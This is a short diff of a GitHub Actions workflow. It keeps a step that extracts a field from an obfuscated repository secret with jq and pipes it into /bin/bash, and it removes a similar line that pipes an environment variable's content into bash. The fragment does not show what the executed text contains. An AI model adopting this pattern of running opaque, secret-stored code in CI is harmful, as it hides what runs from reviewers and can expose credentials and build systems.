@@ -21,7 +21,6 @@ jobs:
           oh482: ${{ secrets.oh482 }}
         run: |
           printf '%s' "$oh482" | jq -r .ctvl26738 | /bin/bash
-          echo $sjs74 | jq -r .tacb18656 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
